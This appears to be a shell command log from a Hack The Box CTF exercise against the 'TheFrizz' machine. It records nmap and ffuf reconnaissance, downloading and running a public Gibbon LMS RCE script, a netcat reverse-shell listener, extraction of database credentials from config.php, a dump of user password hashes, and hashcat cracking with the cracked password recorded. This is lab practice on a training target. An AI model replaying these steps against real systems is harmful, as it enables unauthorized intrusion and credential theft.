[2026-01-16 12:25:13] [pane=%0] [CMD] vim .ip
[2026-01-16 12:28:52] [pane=%0] [CMD] cd ~/Documents/obsidian/docs/CTF/HTB/theFrizz
[2026-01-16 12:34:48] [pane=%0] [CMD] ping -c 3 10.129.232.168
[2026-01-16 12:43:02] [pane=%0] [CMD] nmap -p- --min-rate=3000 -vvv 10.129.232.168 -Pn -oN nmap/theFrizzNmapOpenPorts.txt
[2026-01-16 12:46:40] [pane=%0] [CMD] ports=$(awk '/^[0-9]+\/tcp/ {print $1}' nmap/theFrizzNmapOpenPorts.txt | cut -d/ -f1 | paste -sd,)
[2026-01-16 12:46:47] [pane=%0] [CMD] echo $ports
[2026-01-16 12:47:54] [pane=%0] [CMD] nmap -p$ports -sSCV --min-rate=2000 10.10.11.51 -Pn -vvv -oN logs/nmap/theFrizzNmapServicesVersions.txt
[2026-01-16 12:48:49] [pane=%0] [CMD] nmap -p$ports -sSCV --min-rate=2000 10.129.232.168 -Pn -vvv -oN nmap/theFrizzNmapServicesVersions.txt
[2026-01-16 13:38:48] [pane=%0] [CMD] sudo vim /etc/hosts
[2026-01-16 13:40:03] [pane=%1] [CMD] cd ~/Documents/obsidian/docs/CTF/HTB/theFrizz/
[2026-01-16 13:40:18] [pane=%1] [CMD] cat nmap/theFrizzNmapServicesVersions.txt
[2026-01-16 13:43:56] [pane=%0] [CMD] cat vim /etc/hosts
[2026-01-16 14:04:30] [pane=%0] [CMD] ping -c 1 frizzdc.frizz.htb
[2026-01-16 14:08:53] [pane=%0] [CMD] curl -i http://frizzdc.frizz.htb
[2026-01-16 14:11:58] [pane=%0] [CMD] : #note key ports and services
[2026-01-16 14:12:40] [pane=%0] [CMD] : #note 22/tcp SSH OpenSSH for Windows 9.5 - UNUSUAL for DC
[2026-01-16 14:13:30] [pane=%0] [CMD] : #note 53/tcp DNS (Simple DNS plus)
[2026-01-16 14:14:12] [pane=%0] [CMD] : #note 80/tcp HTTP (Apache 2.4.58 + PHP 8.2.12) - UNUSUAL FOR DC
[2026-01-16 14:14:23] [pane=%0] [CMD] : #note 88/tcp Kerberos
[2026-01-16 14:14:46] [pane=%0] [CMD] : #note 135/tcp MSRPC
[2026-01-16 14:15:05] [pane=%0] [CMD] : #note 139/tcp NetBIOS-SSN
[2026-01-16 14:15:23] [pane=%0] [CMD] : #note 445/tcp SMB (Signing REQUIRED)
[2026-01-16 14:15:37] [pane=%0] [CMD] : #note 636/tcp LDAPS
[2026-01-16 14:16:40] [pane=%0] [CMD] : #note 3268/tcp Global Catalog LDAP
[2026-01-16 14:21:51] [pane=%0] [CMD] : #note exploring the website at frizzdc.frizz.htb- Login page at http://frizzdc.frizz.htb/Gibbon-LMS/
[2026-01-16 14:26:10] [pane=%0] [CMD] ping -c 1 frizzdc.frizz.htb | tee logs/homepage.html 
[2026-01-16 14:26:37] [pane=%0] [CMD] curl -i frizzdc.frizz.htb | tee logs/homepage.html 
[2026-01-16 14:27:57] [pane=%0] [CMD] curl -i frizzdc.frizz.htb | tee logs/Gibbon-LMS.html 
[2026-01-16 14:28:18] [pane=%0] [CMD] curl -i frizzdc.frizz.htb | tee logs/homepage.html 
[2026-01-16 14:28:36] [pane=%0] [CMD] curl -i frizzdc.frizz.htb/Gibbon-LMS | tee logs/Gibbon-LMS.html 
[2026-01-16 14:28:52] [pane=%0] [CMD] curl -i http://frizzdc.frizz.htb/Gibbon-LMS | tee logs/Gibbon-LMS.html 
[2026-01-16 14:35:11] [pane=%0] [CMD] ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.232.168/FUZZ -e .php,.txt -t 2 ffuf/frizz
[2026-01-16 15:03:16] [pane=%0] [CMD] curl -L http://frizzdc.frizz.htb/Gibbon-LMS/ | tee logs/gibbon-homepage.html
[2026-01-16 15:22:49] [pane=%0] [CMD] curl -s http://frizzdc.frizz.htb/Gibbon-LMS/CHANGELOG.txt | head -20
[2026-01-16 15:23:38] [pane=%0] [CMD] curl -s http://frizzdc.frizz.htb/Gibbon-LMS/version.php
[2026-01-16 15:23:59] [pane=%0] [CMD] curl -s http://frizzdc.frizz.htb/Gibbon-LMS/composer.json | grep version
[2026-01-16 15:38:32] [pane=%0] [CMD] ffuf -u http://frizzdc.frizz.htb/Gibbon-LMS/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,401,403 -o ffuf/gibbon-fuzz.json -of json -t 40
[2026-01-17 10:43:55] [pane=%0] [CMD] cat ~/.ip
[2026-01-17 11:05:55] [pane=%0] [CMD] vim ~/.ip
[2026-01-17 11:06:42] [pane=%0] [CMD] vim sudo /etc/hosts
[2026-01-17 11:07:26] [pane=%0] [CMD] vim /etc/hosts
[2026-01-17 11:07:37] [pane=%0] [CMD] sudo vim /etc/hosts
[2026-01-17 12:42:47] [pane=%0] [CMD] searchsploit gibbon
[2026-01-17 12:54:10] [pane=%0] [CMD] : #note found an unauthenticated rce for gibbons v25 https://github.com/ulricvbs/gibbonlms-filewrite_rce
[2026-01-17 12:54:32] [pane=%0] [CMD] wget https://raw.githubusercontent.com/ulricvbs/gibbonlms-filewrite_rce/refs/heads/main/gibbonlms_cmd_shell.py
[2026-01-17 12:54:34] [pane=%0] [CMD] ll
[2026-01-17 12:54:44] [pane=%0] [CMD] chmod +x gibbonlms_cmd_shell.py
[2026-01-17 12:54:45] [pane=%0] [CMD] ll
[2026-01-17 12:55:27] [pane=%0] [CMD] ./gibbonlms_cmd_shell.py
[2026-01-17 12:55:59] [pane=%0] [CMD] ./gibbonlms_cmd_shell.py http://frizzdc.frizz.htb/Gibbon-LMS/
[2026-01-17 12:57:32] [pane=%0] [CMD] ./gibbonlms_cmd_shell.py http://frizzdc.frizz.htb/
[2026-01-17 12:59:52] [pane=%1] [CMD] responder
[2026-01-17 12:59:56] [pane=%1] [CMD] sudo responder
[2026-01-17 13:00:05] [pane=%1] [CMD] sudo -I responder
[2026-01-17 13:02:16] [pane=%1] [CMD] sudo responder -I tun0
[2026-01-17 13:09:35] [pane=%2] [CMD] cd ~/Documents/obsidian/docs/CTF/HTB/theFrizz
[2026-01-17 13:10:19] [pane=%2] [CMD] : #note the gibbonlms-filewrite-rce pulled a shell 
[2026-01-17 13:11:39] [pane=%2] [CMD] : #note reading config.php reveals a u/n & pass - MrGibbonsDB MisterGibbs!Parrot!?1
[2026-01-17 13:12:43] [pane=%0] [CMD] cd nmap
[2026-01-17 13:12:44] [pane=%0] [CMD] ll
[2026-01-17 13:12:53] [pane=%0] [CMD] cat theFrizzNmapServicesVersions.txt
[2026-01-17 13:13:48] [pane=%0] [CMD] cd ..
[2026-01-17 13:14:00] [pane=%0] [CMD] ./gibbonlms_cmd_shell.py http://frizzdc.frizz.htb/
[2026-01-17 13:21:57] [pane=%1] [CMD] rlwrap nc -lnvp 4444
[2026-01-17 13:27:58] [pane=%2] [CMD] : #note used revshells.com to generate a windows reverse shell to kali attack
[2026-01-17 13:30:19] [pane=%2] [CMD] : #note revshells settings powershell #3 (Base64), shell powershell, no encoding, screenshot in logs
[2026-01-17 13:31:55] [pane=%1] [CMD] rlwrap nc -lnvp 4444
[2026-01-17 13:32:10] [pane=%1] [CMD] rlwrap nc -lnvp 4444
[2026-01-17 13:32:29] [pane=%0] [CMD] ./gibbonlms_cmd_shell.py http://frizzdc.frizz.htb/
[2026-01-17 13:39:38] [pane=%2] [CMD] : #note under mysql> type resetroot.bat -- passwordsfor root and pma were deleted
[2026-01-17 13:41:53] [pane=%2] [CMD] : #note database is mysql
[2026-01-17 15:13:46] [pane=%2] [CMD] ll
[2026-01-17 15:13:48] [pane=%2] [CMD] cd evidence
[2026-01-17 15:13:49] [pane=%2] [CMD] ll
[2026-01-17 15:14:41] [pane=%2] [CMD] vim gibbonCreds.txt
[2026-01-17 15:58:48] [pane=%2] [CMD] vim gibbonCredsFull.txt
[2026-01-17 16:01:19] [pane=%3] [CMD] namethathash
[2026-01-17 16:01:38] [pane=%3] [CMD] nth 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03
[2026-01-17 16:01:45] [pane=%3] [CMD] nth '067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03'
[2026-01-17 16:01:51] [pane=%3] [CMD] nth --help
[2026-01-17 16:02:04] [pane=%3] [CMD] nth --text '067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03'
[2026-01-17 16:12:46] [pane=%2] [CMD] hashcat -m 13100 gibbonCredsFull.txt /usr/share/wordlists/rockyou.txt --force
[2026-01-17 16:13:52] [pane=%2] [CMD] vim gibbonCredsFull.txt
[2026-01-17 16:14:22] [pane=%2] [CMD] hashcat -m 13100 gibbonCredsFull.txt /usr/share/wordlists/rockyou.txt --force
[2026-01-17 16:14:57] [pane=%2] [CMD] vim gibbonCredsFull.txt
[2026-01-17 16:15:07] [pane=%2] [CMD] hashcat -m 13100 gibbonCredsFull.txt /usr/share/wordlists/rockyou.txt --force
[2026-01-17 16:15:19] [pane=%2] [CMD] hashcat -m 1400 gibbonCredsFull.txt /usr/share/wordlists/rockyou.txt --force
[2026-01-17 16:15:28] [pane=%2] [CMD] hashcat gibbonCredsFull.txt /usr/share/wordlists/rockyou.txt --force
[2026-01-17 16:16:07] [pane=%2] [CMD] hashcat -m 1410 gibbonCredsFull.txt /usr/share/wordlists/rockyou.txt --force
[2026-01-17 16:17:45] [pane=%2] [CMD] hashcat -m 1420 gibbonCredsFull.txt /usr/share/wordlists/rockyou.txt --force
[2026-01-17 16:21:41] [pane=%2] [CMD] cat gibbonCredsFull.txt
[2026-01-17 16:22:02] [pane=%2] [CMD] ll
[2026-01-17 16:22:08] [pane=%2] [CMD] cd ..
[2026-01-17 16:22:09] [pane=%2] [CMD] ll
[2026-01-17 16:22:27] [pane=%2] [CMD] cd loot
[2026-01-17 16:22:27] [pane=%2] [CMD] ll
[2026-01-17 16:22:29] [pane=%2] [CMD] cd ..
[2026-01-17 16:22:30] [pane=%2] [CMD] ll
[2026-01-17 16:22:36] [pane=%2] [CMD] cd evidence
[2026-01-17 16:22:36] [pane=%2] [CMD] ll
[2026-01-17 16:22:59] [pane=%2] [CMD] vim gibbonCredsDB.txt
[2026-01-17 16:23:06] [pane=%2] [CMD] vim gibbonCredsDB.txt
[2026-01-17 16:26:08] [pane=%3] [CMD] cd ~/Documents/obsidian/docs/CTF/HTB/theFrizz
[2026-01-17 16:26:09] [pane=%3] [CMD] ll
[2026-01-17 16:27:40] [pane=%2] [CMD] ll
[2026-01-17 16:27:49] [pane=%2] [CMD] cat gibbonCredsFull.txt
[2026-01-17 16:28:20] [pane=%2] [CMD] cat gibbonCredsDB.txt
[2026-01-17 16:28:28] [pane=%2] [CMD] vim gibbonCredsDB.txt
[2026-01-17 16:31:14] [pane=%2] [CMD] cat gibbonCredsDB.txt
[2026-01-17 16:31:20] [pane=%2] [CMD] cat gibbonCredsFull.txt
[2026-01-17 16:37:48] [pane=%2] [CMD] : #note gibbon database connected to by using ./mysql -u"MrGibbonsDB" -p'MisterGibbs!Parrot!?1' -e"use gibbon;select * from gibbonperson" 2>&1
[2026-01-17 16:40:04] [pane=%2] [CMD] : #note gibbonperson table has user f.frizzle@frizz.htb with password hash 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03 and salt /aACFhikmNopqrRTVz2489 
[2026-01-17 16:41:44] [pane=%2] [CMD] : #note hashcat gibbonCredsFull.txt /usr/share/wordlists/rockyou.txt --force -- used this command to identify the hash-mode used which was 1420
[2026-01-17 16:41:55] [pane=%2] [CMD] hashcat -m 1420 gibbonCredsFull.txt /usr/share/wordlists/rockyou.txt --force
[2026-01-17 16:42:37] [pane=%2] [CMD] cat gibbonCredsFull.txt
[2026-01-17 16:45:30] [pane=%2] [CMD] : #note cracked f.frissle password as Jenni_Luvs_Magic23 with  hashcat -m 1420 gibbonCredsFull.txt /usr/share/wordlists/rockyou.txt --force 
